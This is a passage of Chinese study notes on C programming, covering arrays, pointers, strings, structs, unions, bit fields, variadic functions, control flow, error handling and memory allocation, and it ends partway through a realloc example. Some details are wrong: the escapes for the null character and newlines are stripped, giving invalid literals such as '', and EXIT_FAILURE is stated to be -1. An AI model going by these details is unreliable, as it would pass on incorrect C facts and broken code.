<h4 id="C%20%E4%B8%AD%E7%9A%84%E5%B7%A6%E5%80%BC%EF%BC%88Lvalues%EF%BC%89%E5%92%8C%E5%8F%B3%E5%80%BC%EF%BC%88Rvalues%EF%BC%89">C 中的左值（Lvalues）和右值（Rvalues）</h4> 
<blockquote> 
 <ol>
<li>
<strong>左值（lvalue）：</strong>指向内存位置的表达式被称为左值（lvalue）表达式。左值可以出现在赋值号的左边或右边。</li>
<li>
<strong>右值（rvalue）：</strong>术语右值（rvalue）指的是存储在内存中某些地址的数值。右值是不能对其进行赋值的表达式，也就是说，右值可以出现在赋值号的右边，但不能出现在赋值号的左边。</li>
</ol> 
</blockquote> 
<h3></h3> 
<h4 id="%E5%B8%B8%E9%87%8F%EF%BC%88%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%9C%9F%E4%B8%8D%E5%8F%98%E7%9A%84%E5%80%BC%EF%BC%89">常量（程序运行期不变的值）</h4> 
<blockquote> 
 <p>定义常量：</p> 
 <ol>
<li>使用 <strong>#define</strong> 预处理器： #define 可以在程序中定义一个常量，它在编译时会被替换为其对应的值。</li>
<li>使用 <strong>const</strong> 关键字：const 关键字用于声明一个只读变量，即该变量的值不能在程序运行时修改。</li>
</ol> 
</blockquote> 
<p></p> 
<h3 id="%E6%95%B0%E7%BB%84">数组</h3> 
<p>C 语言支持<strong>数组</strong>数据结构，它可以存储一个固定大小的相同类型元素的顺序集合。数组是用来存储一系列数据，但它往往被认为是一系列相同类型的变量。</p> 
<p><img alt="" height="385" src="https://images2.imgbox.com/66/f1/V2TFYjnO_o.png" width="1068"></p> 
<p><span style="color:#7b7f82">（所有的数组都是由连续的内存位置组成。最低的地址对应第一个元素，最高的地址对应最后一个元素。）</span></p> 
<p>C 语言还允许我们使用指针来处理数组，这使得对数组的操作更加灵活和高效。</p> 
<h4 id="%E5%A3%B0%E6%98%8E%E6%95%B0%E7%BB%84">声明数组</h4> 
<pre><code class="language-cpp">type arrayName [ arraySize ];
</code></pre> 
<p></p> 
<h4 id="%E8%AE%BF%E9%97%AE%E6%95%B0%E7%BB%84%E5%85%83%E7%B4%A0">访问数组元素</h4> 
<p>数组元素可以通过数组名称加索引进行访问。元素的索引是放在方括号内，跟在数组名称的后边。例如：</p> 
<pre><code class="language-cpp">double salary = balance[9];
</code></pre> 
<p>数组长度可以使用 <strong>sizeof</strong> 运算符来获取数组的长度，例如：</p> 
<pre><code class="language-cpp">int numbers[] = {1, 2, 3, 4, 5};
int length = sizeof(numbers) / sizeof(numbers[0]);</code></pre> 
<p> 在 C 语言中，数组名表示数组的地址，即数组首元素的地址。当我们在声明和定义一个数组时，该数组名就代表着该数组的地址。</p> 
<p>需要注意的是，虽然数组名表示数组的地址，但在大多数情况下，数组名会自动转换为指向数组首元素的指针。这意味着我们可以直接将数组名用于指针运算，例如在函数传递参数或遍历数组时。</p> 
<table><tbody>
<tr>
<th>概念</th>
<th>描述</th>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-multi-dimensional-arrays.html" title="多维数组">多维数组</a></td>
<td>C 支持多维数组。多维数组最简单的形式是二维数组。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-passing-arrays-to-functions.html" title="传递数组给函数">传递数组给函数</a></td>
<td>您可以通过指定不带索引的数组名称来给函数传递一个指向数组的指针。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-return-arrays-from-function.html" title="从函数返回数组">从函数返回数组</a></td>
<td>C 允许从函数返回数组。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-pointer-to-an-array.html" title="指向数组的指针">指向数组的指针</a></td>
<td>您可以通过指定不带索引的数组名称来生成一个指向数组中第一个元素的指针。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-static-dynamic-array.html" title="静态数组与动态数组">静态数组与动态数组</a></td>
<td>态数组在编译时分配内存，大小固定，而动态数组在运行时手动分配内存，大小可变。</td>
</tr>
</tbody></table> 
<p></p> 
<h3 id="enum%EF%BC%88%E6%9E%9A%E4%B8%BE%EF%BC%89">enum（枚举）</h3> 
<p>枚举是 C 语言中的一种基本数据类型，用于定义一组具有离散值的常量。，它可以让数据更简洁，更易读。</p> 
<p>枚举类型通常用于为程序中的一组相关的常量取名字，以便于程序的可读性和维护性。</p> 
<p>定义一个枚举类型，需要使用 enum 关键字，后面跟着枚举类型的名称，以及用大括号 {} 括起来的一组枚举常量。每个枚举常量可以用一个标识符来表示，也可以为它们指定一个整数值，如果没有指定，那么<span style="color:#fe2c24">默认从 0 开始递增</span>。</p> 
<p>枚举语法定义格式为：</p> 
<pre><code class="language-cpp">enum　枚举名　{枚举元素1,枚举元素2,……};</code></pre> 
<p><img alt="" height="734" src="https://images2.imgbox.com/03/f7/jhp2ODEm_o.png" width="926"></p> 
<p>在C 语言中，枚举类型是被当做 int 或者 unsigned int 类型来处理的，所以按照 C 语言规范是没有办法遍历枚举类型的。</p> 
<p>不过在一些特殊的情况下，枚举类型必须连续是可以实现有条件的遍历。</p> 
<p>以下实例使用 for 来遍历枚举的元素：</p> 
<pre><code class="language-cpp"> enum DAY
{
      MON=1, TUE, WED, THU, FRI, SAT, SUN
} day;
int main()
{
    // 遍历枚举元素
    for (day = MON; day &lt;= SUN; day++) {
        printf("枚举元素：%d n", day);
    }
}

//以下枚举类型不连续，则无法遍历
enum
{
    ENUM_0,//默认从0开始
    ENUM_10 = 10,
    ENUM_11
};</code></pre> 
<p></p> 
<h3 id="%E6%8C%87%E9%92%88*%EF%BC%88%E9%80%9A%E5%B8%B8%E8%AF%B4%E7%9A%84%E6%98%AF%E6%8C%87%E5%90%91%E6%95%B4%E5%9E%8B%E3%80%81%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%8F%8A%E6%95%B0%E7%BB%84%E7%AD%89%E5%8F%98%E9%87%8F%EF%BC%89">指针*（通常说的是指向整型、字符型及数组等变量）</h3> 
<p>每一个变量都有一个内存位置，每一个内存位置都定义了可使用 &amp; 运算符访问的地址，它表示了在内存中的一个地址。</p> 
<p><img alt="" height="683" src="https://images2.imgbox.com/18/a9/kgIHiwyi_o.png" width="1016"></p> 
<pre><code class="language-cpp">type *var_name;
//例子如下：
int    *ip;    /* 一个整型的指针 */
double *dp;    /* 一个 double 型的指针 */
float  *fp;    /* 一个浮点型的指针 */
char   *ch;    /* 一个字符型的指针 */
</code></pre> 
<h4 id="null%20%E6%8C%87%E9%92%88">null 指针</h4> 
<p>在变量声明的时候，如果没有确切的地址可以赋值，为指针变量赋一个 NULL 值是一个良好的编程习惯。赋为 NULL 值的指针被称为<strong>空</strong>指针。</p> 
<table>
<caption>
   指针详解 
 </caption>
<tbody>
<tr>
<th>概念</th>
<th>描述</th>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-pointer-arithmetic.html" title="指针的算术运算">指针的算术运算</a></td>
<td>可以对指针进行四种算术运算：++、--、+、-</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-array-of-pointers.html" title="指针数组">指针数组</a></td>
<td>可以定义用来存储指针的数组</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-pointer-to-pointer.html" title="指向指针的指针">指向指针的指针</a></td>
<td>C 允许指向指针的指针</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-passing-pointers-to-functions.html" title="传递指针给函数">传递指针给函数</a></td>
<td>通过引用或地址传递参数，使传递的参数在调用函数中被改变</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-return-pointer-from-functions.html" title="从函数返回指针">从函数返回指针</a></td>
<td>C 允许函数返回指针到局部变量、静态变量和动态内存分配</td>
</tr>
</tbody>
</table> 
<h4 id="%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%EF%BC%88%E6%8C%87%E5%90%91%E5%87%BD%E6%95%B0%E7%9A%84%E6%8C%87%E9%92%88%E5%8F%98%E9%87%8F%EF%BC%89">函数指针（指向函数的指针变量）</h4> 
<pre><code class="language-cpp">typedef int (*fun_ptr)(int,int); 
//声明一个指向同样参数、返回值的函数指针类型
</code></pre> 
<p><span style="color:#fe2c24">函数指针变量是可以作为一个函数的参数，把通过函数指针来调用函数叫做回调函数。</span></p> 
<p></p> 
<h3 id="%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88%E4%BD%BF%E7%94%A8%E7%A9%BA%E5%AD%97%E7%AC%A6%20%5C0%20%E7%BB%93%E5%B0%BE%E7%9A%84%E4%B8%80%E7%BB%B4%E5%AD%97%E7%AC%A6%E6%95%B0%E7%BB%84%EF%BC%89">字符串（使用空字符  结尾的一维字符数组）</h3> 
<p>so  是用于标记字符串的结束符，<strong>空字符（Null character</strong>）又称结束符，缩写 NUL，是一个数值为 0 的控制字符， 是转义字符，意思是告诉编译器，这不是字符 0，而是空字符哦！</p> 
<pre><code class="language-cpp">char site[7] = {'R', 'U', 'N', 'O', 'O', 'B', ''};
//等同于下面这个
char site[] = "RUNOOB";
</code></pre> 
<p>其实我们不需要把 null 字符放在字符串常量的末尾。C 编译器会在初始化数组时，自动把  放在字符串的末尾以表示此字符串已经结束了。</p> 
<table>
<caption>
   操作字符串的函数 
 </caption>
<tbody>
<tr>
<th>序号</th>
<th>函数 &amp; 目的</th>
</tr>
<tr>
<td>1</td>
<td>
<strong>strcpy(s1, s2);</strong><br> 复制字符串 s2 到字符串 s1</td>
</tr>
<tr>
<td>2</td>
<td>
<strong>strcat(s1, s2);</strong><br> 连接字符串 s2 到字符串 s1 的末尾</td>
</tr>
<tr>
<td>3</td>
<td>
<strong>strlen(s1);</strong><br> 返回字符串 s1 的长度</td>
</tr>
<tr>
<td>4</td>
<td>
<strong>strcmp(s1, s2);</strong><br> 如果 s1 和 s2 是相同的，则返回 0；如果 s1&lt;s2 则返回小于 0；如果 s1&gt;s2 则返回大于 0</td>
</tr>
<tr>
<td>5</td>
<td>
<strong>strchr(s1, ch);</strong><br> 返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置</td>
</tr>
<tr>
<td>6</td>
<td>
<strong>strstr(s1, s2);</strong><br> 返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置</td>
</tr>
</tbody>
</table> 
<p></p> 
<h3 id="%E7%BB%93%E6%9E%84%E4%BD%93">结构体</h3> 
<p>C 数组允许定义可存储相同类型数据项的变量，<strong>结构</strong>是 C 编程中另一种用户自定义的可用的数据类型，它允许您存储不同类型的数据项。类似 Java 的集合</p> 
<pre><code class="language-cpp">struct tag { 
    member-list
    member-list 
    member-list  
    ...
} variable-list ;
//一般情况下 tag、member-list、variable-list 这三部分至少要写出两个</code></pre> 
<h4 id="%E8%AE%BF%E9%97%AE%E7%BB%93%E6%9E%84%E6%88%90%E5%91%98">访问结构成员</h4> 
<p>为了访问结构的成员，我们使用<strong>成员访问运算符（.）</strong>。成员访问运算符是结构变量名称和我们要访问的结构成员之间的一个句号“.”</p> 
<p></p> 
<h4 id="%E6%8C%87%E5%90%91%E7%BB%93%E6%9E%84%E7%9A%84%E6%8C%87%E9%92%88">指向结构的指针</h4> 
<pre><code class="language-cpp">struct Books *struct_pointer;
struct Books Book1;
struct_pointer = &amp;Book1;</code></pre> 
<p>结构指针要访问结构成员必须使用 -&gt; 运算符，如下：</p> 
<pre><code class="language-cpp">struct_pointer -&gt; title;
</code></pre> 
<p></p> 
<h4 id="%E7%BB%93%E6%9E%84%E4%BD%93%E5%A4%A7%E5%B0%8F%E7%9A%84%E8%AE%A1%E7%AE%97">结构体大小的计算</h4> 
<p>C 语言中，我们可以使用 <strong>sizeof</strong> 运算符来计算结构体的大小，<strong>sizeof</strong> 返回的是给定类型或变量的字节大小。</p> 
<p>对于结构体，<strong>sizeof</strong> 将返回结构体的总字节数，包括所有成员变量的大小以及可能的填充字节。</p> 
<p><em><span style="color:#7b7f82">（<strong>注意</strong>，结构体的大小可能会受到编译器的优化和对齐规则的影响，编译器可能会在结构体中插入一些额外的填充字节以对齐结构体的成员变量，以提高内存访问效率。因此，结构体的实际大小可能会大于成员变量大小的总和，如果你需要确切地了解结构体的内存布局和对齐方式，可以使用 offsetof 宏和 __attribute__((packed)) 属性等进一步控制和查询结构体的大小和对齐方式）</span></em></p> 
<p></p> 
<h3 id="%E5%85%B1%E7%94%A8%E4%BD%93">共用体</h3> 
<p>可以使用 <strong>union</strong> 关键字来定义共用体类型的变量</p> 
<pre><code class="language-cpp">union [union tag]
{
   member definition;
   member definition;
   ...
   member definition;
} [one or more union variables];</code></pre> 
<p><em><span style="color:#7b7f82">（共用体占用的内存应足够存储共用体中最大的成员）</span></em></p> 
<h4 id="%E8%AE%BF%E9%97%AE%E5%85%B1%E7%94%A8%E4%BD%93%E6%88%90%E5%91%98">访问共用体成员</h4> 
<p>成员访问运算符是共用体变量名称和我们要访问的共用体成员之间的一个“.”</p> 
<p></p> 
<p><span style="color:#fe2c24">同一时刻只能使用一个数据成员</span></p> 
<p></p> 
<h3 id="%E4%BD%8D%E5%9F%9F%EF%BC%88%E7%89%B9%E6%AE%8A%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%E6%88%90%E5%91%98%EF%BC%89">位域（特殊的结构体成员）</h3> 
<p>位域允许我们按位对成员进行定义，即指定其占用的位数。例子如下：</p> 
<pre><code class="language-cpp">struct
{
  unsigned int widthValidated : 1;
  unsigned int heightValidated : 1;
} status;
</code></pre> 
<p><em><span style="color:#7b7f82">（位域的访问是通过点运算符（<code>.</code>）来实现的，与普通的结构体成员访问方式相同。八位一字节）</span></em></p> 
<p>分解到小为 char 类型</p> 
<p><span style="color:#fe2c24">结构体以 4 bytes 为位域存储单位</span></p> 
<p>位域可以是无名位域，这时它只用来作填充或调整位置。无名的位域是不能使用的。例如：</p> 
<pre><code class="language-cpp">struct k{
    int a:1;
    int  :2;    /* 该 2 位不能使用 */
    int b:3;
    int c:2;
};</code></pre> 
<p>位域的使用和结构成员的使用相同，其一般形式为：</p> 
<blockquote> 
 <ul>
<li>位域变量名.位域名</li>
<li>位域变量名-&gt;位域名</li>
</ul> 
</blockquote> 
<p><em><span style="color:#7b7f82">（位域允许用各种格式输出。）</span></em></p> 
<p></p> 
<h3 id="%E4%B8%BA%E7%B1%BB%E5%9E%8B%E5%8F%96%E4%B8%AA%E6%96%B0%E5%90%8D%E5%AD%97%20%E2%80%94%E2%80%94%20typedef">为类型取个新名字 —— typedef</h3> 
<p></p> 
<table border="1" cellpadding="1" cellspacing="1" style="width:500px">
<thead><tr>
<th>typedef 新名字</th>
<th>#define 预先定义别名</th>
</tr></thead>
<tbody>
<tr>
<td>
<strong>typedef</strong> 仅限于为类型定义符号名称</td>
<td>
<strong>#define</strong> 不仅可以为类型定义别名，也能为数值定义别名，比如您可以定义 1 为 ONE</td>
</tr>
<tr>
<td>
<strong>typedef</strong> 是由编译器执行解释的</td>
<td>
<strong>#define</strong> 语句是由预编译器进行处理的</td>
</tr>
</tbody>
</table> 
<p></p> 
<h3 id="%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0">可变参数</h3> 
<p>希望函数带有可变数量的参数，而不是预定义数量的参数。</p> 
<p>C 语言为这种情况提供了一个解决方案，它允许您定义一个函数，能根据具体的需求接受可变数量的参数。</p> 
<pre><code class="language-cpp">int func_name(int arg1, ...);</code></pre> 
<blockquote> 
 <p>请注意，函数 <strong>func()</strong> 最后一个参数写成省略号，即三个点号（<strong>...</strong>），省略号之前的那个参数是 <strong>int</strong>，代表了要传递的可变参数的总数。为了使用这个功能，您需要使用 <strong>stdarg.h</strong> 头文件，该文件提供了实现可变参数功能的函数和宏。具体步骤如下：</p> 
 <ul>
<li>定义一个函数，最后一个参数为省略号，省略号前面可以设置自定义参数</li>
<li>在函数定义中创建一个 <strong>va_list</strong> 类型变量，该类型是在 stdarg.h 头文件中定义的</li>
<li>使用 <strong>int</strong> 参数和 <strong>va_start()</strong> 宏来初始化 <strong>va_list</strong> 变量为一个参数列表。宏 <strong>va_start()</strong> 是在 stdarg.h 头文件中定义的</li>
<li>使用 <strong>va_arg()</strong> 宏和 <strong>va_list</strong> 变量来访问参数列表中的每个项</li>
<li>使用宏 <strong>va_end()</strong> 来清理赋予 <strong>va_list</strong> 变量的内存</li>
</ul> 
 <p></p> 
 <p>常用的宏有：</p> 
 <ul>
<li> <p><code><strong>va_start(ap, last_arg)</strong></code>：初始化可变参数列表。<code>ap</code> 是一个 <code>va_list</code> 类型的变量，<code>last_arg</code> 是最后一个固定参数的名称（也就是可变参数列表之前的参数）。该宏将 <code>ap</code> 指向可变参数列表中的第一个参数</p> </li>
<li> <p><code><strong>va_arg(ap, type)</strong></code>：获取可变参数列表中的下一个参数。<code>ap</code> 是一个 <code>va_list</code> 类型的变量，<code>type</code> 是下一个参数的类型。该宏返回类型为 <code>type</code> 的值，并将 <code>ap</code> 指向下一个参数</p> </li>
<li> <p><code><strong>va_end(ap)</strong></code>：结束可变参数列表的访问。<code>ap</code> 是一个 <code>va_list</code> 类型的变量。该宏将 <code>ap</code> 置为 <code>NULL</code></p> </li>
</ul> 
</blockquote> 
<p></p> 
<p></p> 
<h2 id="4.%E8%AF%AD%E5%8F%A5%26%E8%A1%A8%E8%BE%BE%E5%BC%8F">4.语句&amp;表达式</h2> 
<p>程序运行逻辑</p> 
<blockquote> 
 <p>; 是语句结束符，它表明一个逻辑实体的结束</p> 
</blockquote> 
<h3 id="A.%E5%88%A4%E6%96%AD">A.判断</h3> 
<p>判断结构要求程序员指定一个或多个要评估或测试的条件，以及条件为真时要执行的语句（必需的）和条件为假时要执行的语句（可选的）。</p> 
<p>C 语言把任何<strong>非零</strong>和<strong>非空</strong>的值假定为 <strong>true</strong>，把<strong>零</strong>或 <strong>null</strong> 假定为 <strong>false</strong></p> 
<p><img alt="" height="766" src="https://images2.imgbox.com/6d/00/cN9jEeHl_o.png" width="509"></p> 
<p><span style="color:#7b7f82">（上面是大多数编程语言中典型的判断结构的一般形式）</span></p> 
<h4 id="%E5%88%A4%E6%96%AD%E8%AF%AD%E5%8F%A5">判断语句</h4> 
<table><tbody>
<tr>
<th>语句</th>
<th>描述</th>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-if.html" title="if 语句">if 语句</a></td>
<td>一个 <strong>if 语句</strong> 由一个布尔表达式后跟一个或多个语句组成。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-if-else.html" title="if...else 语句">if...else 语句</a></td>
<td>一个 <strong>if 语句</strong> 后可跟一个可选的 <strong>else 语句</strong>，else 语句在布尔表达式为假时执行。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-nested-if.html" title="嵌套 if 语句">嵌套 if 语句</a></td>
<td>您可以在一个 <strong>if</strong> 或 <strong>else if</strong> 语句内使用另一个 <strong>if</strong> 或 <strong>else if</strong> 语句。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-switch.html" title="switch 语句">switch 语句</a></td>
<td>一个 <strong>switch</strong> 语句允许测试一个变量等于多个值时的情况。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-nested-switch.html" title="嵌套 switch 语句">嵌套 switch 语句</a></td>
<td>您可以在一个 <strong>switch</strong> 语句内使用另一个 <strong>switch </strong> 语句。</td>
</tr>
</tbody></table> 
<h4 id="%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97%E7%AC%A6">三元运算符</h4> 
<p><strong>条件运算符 ? :</strong>，可以用来替代 <strong>if...else</strong> 语句。它的一般形式如下：</p> 
<pre><code class="language-java">Exp1 ? Exp2 : Exp3;
/*
其中，Exp1、Exp2 和 Exp3 是表达式。请注意，冒号的使用和位置。
? 表达式的值是由 Exp1 决定的。如果 Exp1 为真，则计算 Exp2 的值，结果即为整个表达式的值。
如果 Exp1 为假，则计算 Exp3 的值，结果即为整个表达式的值
*/</code></pre> 
<p><img alt="" height="598" src="https://images2.imgbox.com/8f/c0/5KXvsIkr_o.png" width="748"></p> 
<h3 id="B.%E5%BE%AA%E7%8E%AF">B.循环</h3> 
<p>我们可能需要多次执行同一块代码。一般情况下，语句是按顺序执行的：函数中的第一个语句先执行，接着是第二个语句，依此类推。循环语句允许我们多次执行一个语句或语句组，下面是大多数编程语言中循环语句的流程图：</p> 
<p><img alt="" height="800" src="https://images2.imgbox.com/2c/71/wZJX6ig3_o.png" width="750"></p> 
<h4 id="%E5%BE%AA%E7%8E%AF%E7%B1%BB%E5%9E%8B">循环类型</h4> 
<table><tbody>
<tr>
<th>循环类型</th>
<th>描述</th>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-while-loop.html" title="while 循环">while 循环</a></td>
<td>当给定条件为真时，重复语句或语句组。它会在执行循环主体之前测试条件。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-for-loop.html" title="for 循环">for 循环</a></td>
<td>多次执行一个语句序列，简化管理循环变量的代码。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-do-while-loop.html" title="do...while 循环">do...while 循环</a></td>
<td>除了它是在循环主体结尾测试条件外，其他与 while 语句类似。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-nested-loops.html" title="嵌套循环">嵌套循环</a></td>
<td>您可以在 while、for 或 do..while 循环内使用一个或多个循环。</td>
</tr>
</tbody></table> 
<p>更多内容：<a href="https://www.runoob.com/w3cnote/c-while-and-do-while.html" title="C while 和 do while 区别">C while 和 do while 区别</a></p> 
<p></p> 
<h4 id="%E5%BE%AA%E7%8E%AF%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5">循环控制语句</h4> 
<p>循环控制语句改变你代码的执行顺序。通过它你可以实现代码的跳转。</p> 
<p>C 提供了下列的循环控制语句。点击链接查看每个语句的细节。</p> 
<table><tbody>
<tr>
<th>控制语句</th>
<th>描述</th>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-break-statement.html" title="break 语句">break 语句</a></td>
<td>终止<strong>循环</strong>或 <strong>switch</strong> 语句，程序流将继续执行紧接着循环或 switch 的下一条语句。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-continue-statement.html" title="continue 语句">continue 语句</a></td>
<td>告诉一个循环体立刻停止本次循环迭代，重新开始下次循环迭代。</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/cprogramming/c-goto-statement.html" title="goto 语句">goto 语句</a></td>
<td>将控制转移到被标记的语句。但是不建议在程序中使用 goto 语句。</td>
</tr>
</tbody></table> 
<p></p> 
<h4 id="%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF">无限循环</h4> 
<p>如果条件永远不为假，则循环将变成无限循环。<strong>for</strong> 循环在传统意义上可用于实现无限循环。由于构成循环的三个表达式中任何一个都不是必需的，您可以将某些条件表达式留空来构成一个无限循环。</p> 
<p><span style="color:#7b7f82"><em><strong>（注意：</strong>您可以按 Ctrl + C 键终止一个无限循环）</em></span></p> 
<p></p> 
<h3 id="C.%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">C.错误处理</h3> 
<p>C 语言不提供对错误处理的直接支持，但是作为一种系统编程语言，它以返回值的形式允许您访问底层数据</p> 
<p><span style="color:#7b7f82"><em>（注意！在发生错误时，大多数的 C 或 UNIX 函数调用返回 1 或 NULL，同时会设置一个错误代码 <strong>errno</strong>，该错误代码是全局变量，表示在函数调用期间发生了错误。您可以在 errno.h 头文件中找到各种各样的错误状态代码。）</em></span></p> 
<p></p> 
<h4 id="errno%E3%80%81perror()%20%E5%92%8C%20strerror()">errno、perror() 和 strerror()</h4> 
<p><span style="color:#7b7f82">C 语言提供了 <strong>perror()</strong> 和 <strong>strerror()</strong> 函数来显示与 <strong>errno</strong> 相关的文本消息。</span></p> 
<blockquote> 
 <ul>
<li>
<strong>perror()</strong> 函数显示输出您传给它的字符串，然后跟上一个冒号、一个空格和当前 errno 值的文本表示形式</li>
<li>
<strong>strerror()</strong> 函数，返回一个指针，指针指向当前 errno 值的文本表示形式。</li>
</ul> 
</blockquote> 
<p><span style="color:#fe2c24">被 0 除的错误（在进行除法运算时，如果不检查除数是否为零，则会导致一个运行时错误）</span></p> 
<p></p> 
<h4 id="%E7%A8%8B%E5%BA%8F%E9%80%80%E5%87%BA%E7%8A%B6%E6%80%81">程序退出状态</h4> 
<p>通常情况下，程序成功执行完一个操作正常退出的时候会带有值 EXIT_SUCCESS。在这里，EXIT_SUCCESS 是宏，它被定义为 0。</p> 
<p>如果程序中存在一种错误情况，当您退出程序时，会带有状态值 EXIT_FAILURE，被定义为 -1。</p> 
<p></p> 
<p></p> 
<p></p> 
<h2 id="5.%E6%B3%A8%E9%87%8A%26%E7%A9%BA%E6%A0%BC%E5%8F%8A%E8%A1%A5%E5%85%85%EF%BC%88%E9%83%BD%E4%BC%9A%E8%A2%AB%E7%BC%96%E8%AF%91%E5%99%A8%E7%BB%99%E5%BF%BD%E7%95%A5%E6%8E%89%EF%BC%89">5.注释&amp;空格及补充（都会被编译器给忽略掉）</h2> 
<blockquote> 
 <ul>
<li>//我是单行注释</li>
<li>/*我是双行注释*/</li>
</ul> 
</blockquote> 
<h3 id="%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%A7%84%E5%88%99">作用域规则</h3> 
<p>任何一种编程中，作用域是程序中定义的变量所存在的区域，超过该区域变量就不能被访问。C 语言中有三个地方可以声明变量：</p> 
<ol>
<li>在函数或块内部的<strong>局部</strong>变量</li>
<li>在所有函数外部的<strong>全局</strong>变量</li>
<li>在<strong>形式</strong>参数的函数参数定义中</li>
</ol> 
<p></p> 
<h4 id="%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F">局部变量</h4> 
<p>在某个函数或块的内部声明的变量称为局部变量。它们只能被该函数或该代码块内部的语句使用。局部变量在函数外部是不可知的</p> 
<p></p> 
<h4 id="%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F">全局变量</h4> 
<p>全局变量是定义在函数外部，通常是在程序的顶部。全局变量在整个程序生命周期内都是有效的，在任意的函数内部能访问全局变量。</p> 
<p>全局变量可以被任何函数访问。也就是说，全局变量在声明后整个程序中都是可用的</p> 
<p></p> 
<h4 id="%E5%BD%A2%E5%BC%8F%E5%8F%82%E6%95%B0">形式参数</h4> 
<p>函数的参数，形式参数，被当作该函数内的局部变量，如果与全局变量同名它们会优先使用。</p> 
<p></p> 
<h4 id="%E5%88%9D%E5%A7%8B%E5%8C%96%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E5%92%8C%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F">初始化局部变量和全局变量</h4> 
<p>当局部变量被定义时，系统不会对其初始化，您必须自行对其初始化。定义全局变量时，系统会自动对其初始化</p> 
<p></p> 
<h3 id="%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86">内存管理</h3> 
<p>在 C 语言中，内存是通过指针变量来管理的。指针是一个变量，它存储了一个内存地址，这个内存地址可以指向任何数据类型的变量，包括整数、浮点数、字符和数组等。C 语言提供了一些函数和运算符，使得程序员可以对内存进行操作，包括分配、释放、移动和复制等。</p> 
<table><tbody>
<tr>
<th>序号</th>
<th>函数和描述</th>
</tr>
<tr>
<td>1</td>
<td>
<strong>void *calloc(int num, int size);</strong><br> 在内存中动态地分配 num 个长度为 size 的连续空间，并将每一个字节都初始化为 0。所以它的结果是分配了 num*size 个字节长度的内存空间，并且每个字节的值都是 0</td>
</tr>
<tr>
<td>2</td>
<td>
<strong>void free(void *address); </strong><br> 该函数释放 address 所指向的内存块,释放的是动态分配的内存空间</td>
</tr>
<tr>
<td>3</td>
<td>
<strong>void *malloc(int num); </strong><br> 在堆区分配一块指定大小的内存空间，用来存放数据。这块内存空间在函数执行完成后不会被初始化，它们的值是未知的</td>
</tr>
<tr>
<td>4</td>
<td>
<strong>void *realloc(void *address, int newsize); </strong><br> 该函数重新分配内存，把内存扩展到 <strong>newsize</strong>
</td>
</tr>
</tbody></table> 
<p><em><span style="color:#7b7f82">（<strong>注意：</strong>void * 类型表示未确定类型的指针。C、C++ 规定 void * 类型可以通过类型转换强制转换为任何其它类型的指针。）</span></em></p> 
<h4 id="%E5%8A%A8%E6%80%81%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98">动态分配内存</h4> 
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
 
int main()
{
   char name[100];
   char *description;
 
   strcpy(name, "Zara Ali");
 
   /* 动态分配内存 */
   description = (char *)malloc( 200 * sizeof(char) );
   if( description == NULL )
   {
      fprintf(stderr, "Error - unable to allocate required memoryn");
   }
   else
   {
      strcpy( description, "Zara ali a DPS student in class 10th");
   }
   printf("Name = %sn", name );
   printf("Description: %sn", description );
}</code></pre> 
<h4 id="%E9%87%8D%E6%96%B0%E8%B0%83%E6%95%B4%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E5%92%8C%E9%87%8A%E6%94%BE%E5%86%85%E5%AD%98">重新调整内存大小和释放内存</h4> 
<p>当程序退出时，操作系统会自动释放所有分配给程序的内存，但是，建议您在不需要内存时，都应该调用函数 <strong>free()</strong> 来释放内存。</p> 
<p>或者，您可以通过调用函数 <strong>realloc()</strong> 来增加或减少已分配的内存块的大小。让我们使用 realloc() 和 free() 函数，再次查看上面的实例：</p> 
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
 
int main()
{
   char name[100];
   char *description;
 
   strcpy(name, "Zara Ali");
 
   /* 动态分配内存 */
   description = (char *)malloc( 30 * sizeof(char) );
   if( description == NULL )
   {
      fprintf(stderr, "Error - unable to allocate required memoryn");
   }
   else
   {
